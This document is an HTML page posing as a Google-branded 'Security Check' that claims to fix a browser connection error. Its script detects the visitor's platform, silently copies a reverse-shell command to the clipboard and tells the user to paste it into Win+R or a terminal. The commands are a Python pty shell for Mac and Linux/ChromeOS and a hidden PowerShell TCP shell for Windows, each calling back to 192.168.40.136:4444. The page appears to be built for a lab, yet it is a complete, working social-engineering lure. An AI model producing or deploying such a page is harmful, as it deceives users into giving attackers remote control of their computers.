<!DOCTYPE html>
<html>
<head>
    <title>Security Check</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; margin-top: 100px; background: #f9f9f9; }
        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; width: 350px; }
        button { background: #4285f4; color: white; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; font-weight: bold; }
        .instructions { display: none; background: #fff3cd; padding: 15px; margin-top: 15px; border: 1px solid #ffeeba; text-align: left; font-size: 14px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92">
        <h3 id="title">Verify your Identity</h3>
        <p id="msg">Click below to fix a browser connection error.</p>
        <button id="btn" onclick="copyAndTrap()">Fix Connection</button>

        <div id="steps" class="instructions">
            <strong id="step-title">Manual Fix Required:</strong><br>
            <span id="step-desc">
                1. Press <b>Win + R</b> on your keyboard.<br>
                2. <b>Right-Click</b> in the box and <b>Paste</b>.<br>
                3. Press <b>Enter</b> to verify.
            </span>
        </div>
    </div>

    <script>
        function copyAndTrap() {
            // Ensure this IP is reachable from the Chromebook's Linux Container
            const ip = "192.168.40.136"; 
            const platform = navigator.platform.toLowerCase();
            let cmd = "";
            let instructions = "";

            if (platform.includes('mac')) {
                // Interactive Zsh shell for Mac
                cmd = `python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${ip}',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/zsh')\"`;
                instructions = `
                    1. Press <b>Command + Space</b> and type <b>Terminal</b>.<br>
                    2. Press <b>Enter</b>.<br>
                    3. <b>Command + V</b> to paste and press <b>Enter</b>.
                `;
            } else if (platform.includes('linux') || platform.includes('cros')) {
                // Chromebook/Linux: Fixed fileno logic and added gateway fallback
                cmd = `python3 -c "import socket,os,pty,subprocess; host='${ip}'; try: res=subprocess.check_output(['ip','route']); host=res.decode().split('default via ')[1].split(' ')[0]; except: pass; s=socket.socket(); s.connect((host,4444)); f=s.fileno(); os.dup2(f,0); os.dup2(f,1); os.dup2(f,2); pty.spawn('/bin/bash')\"`;
                instructions = `
                    1. Open the <b>Terminal</b> app from your App Launcher.<br>
                    2. Click on <b>Penguin</b> (or your Linux container).<br>
                    3. <b>Ctrl + Shift + V</b> to paste and press <b>Enter</b>.<br><br>
                    <i>Note: The script will automatically try to find your server.</i>
                `;
            } else {
                // Default Windows PowerShell command
                cmd = `powershell -WindowStyle Hidden -Command "$c = New-Object System.Net.Sockets.TCPClient('${ip}',4444);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2  = $sb + 'PS ' + (pwd).Path + '> ';$sendb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sendb,0,$sendb.Length);$s.Flush()};$c.Close()"`;
                instructions = `
                    1. Press <b>Win + R</b> on your keyboard.<br>
                    2. <b>Right-Click</b> in the box and <b>Paste</b>.<br>
                    3. Press <b>Enter</b> to verify.
                `;
            }

            navigator.clipboard.writeText(cmd).then(() => {
                document.getElementById('btn').style.display = 'none';
                document.getElementById('msg').innerText = "Follow the steps to complete verification:";
                document.getElementById('step-desc').innerHTML = instructions;
                document.getElementById('steps').style.display = 'block';
            });
        }
    </script>
</body>
</html>
